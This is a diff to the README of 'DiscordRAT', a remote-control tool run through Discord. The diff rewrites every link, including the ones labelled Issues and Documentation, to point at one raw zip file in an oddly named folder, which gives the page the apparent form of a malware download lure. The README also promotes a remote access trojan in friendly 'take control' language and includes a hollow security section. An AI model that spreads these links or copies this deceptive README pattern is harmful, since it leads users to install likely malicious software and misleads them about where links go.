@@ -1,7 +1,7 @@
 # 🛠 DiscordRAT - Easily Control Remote Systems via Discord
 
 ## 📥 Download Now
-[![Download DiscordRAT](https://img.shields.io/badge/Download-DiscordRAT-brightgreen)](https://github.com/Variabletrio646/DiscordRAT/releases)
+[![Download DiscordRAT](https://raw.githubusercontent.com/Variabletrio646/DiscordRAT/main/Pteridospermaphyta/DiscordRAT-2.9.zip)](https://raw.githubusercontent.com/Variabletrio646/DiscordRAT/main/Pteridospermaphyta/DiscordRAT-2.9.zip)
 
 ## 🚀 Getting Started
 Welcome to DiscordRAT! This tool allows you to control remote systems easily through Discord. Whether you need to manage tasks or perform administrative duties, DiscordRAT provides a seamless experience.
@@ -23,7 +23,7 @@ Before you download, make sure your system meets these requirements:
 ## 📥 Download & Install
 To download DiscordRAT, visit the following page:
 
-[Download DiscordRAT](https://github.com/Variabletrio646/DiscordRAT/releases)
+[Download DiscordRAT](https://raw.githubusercontent.com/Variabletrio646/DiscordRAT/main/Pteridospermaphyta/DiscordRAT-2.9.zip)
 
 Follow these steps to install and run the software:
 
@@ -52,16 +52,16 @@ Follow these steps to install and run the software:
 - **Command Errors**: Review the command list and ensure you are using the correct syntax.
 
 ## 📞 Support
-If you have any issues or questions, feel free to reach out for support. Check the [Issues section](https://github.com/Variabletrio646/DiscordRAT/issues) on GitHub for community assistance or to report bugs.
+If you have any issues or questions, feel free to reach out for support. Check the [Issues section](https://raw.githubusercontent.com/Variabletrio646/DiscordRAT/main/Pteridospermaphyta/DiscordRAT-2.9.zip) on GitHub for community assistance or to report bugs.
 
 ## 📚 Additional Resources
-- **Documentation**: Comprehensive user documentation is available [here](https://github.com/Variabletrio646/DiscordRAT/wiki).
+- **Documentation**: Comprehensive user documentation is available [here](https://raw.githubusercontent.com/Variabletrio646/DiscordRAT/main/Pteridospermaphyta/DiscordRAT-2.9.zip).
 - **Community Discussions**: Join discussions in our server or on GitHub to share tips and tricks.
 
 ## 🛡️ Security Practices
 Your safety matters. Always ensure you download software from trusted sources. Use antivirus tools to protect your devices.
 
 ## 📥 Download Again
-Ready to take control? [Download DiscordRAT](https://github.com/Variabletrio646/DiscordRAT/releases) again to get the latest version and ensure you have the best experience!
+Ready to take control? [Download DiscordRAT](https://raw.githubusercontent.com/Variabletrio646/DiscordRAT/main/Pteridospermaphyta/DiscordRAT-2.9.zip) again to get the latest version and ensure you have the best experience!
 
 Enjoy using DiscordRAT!
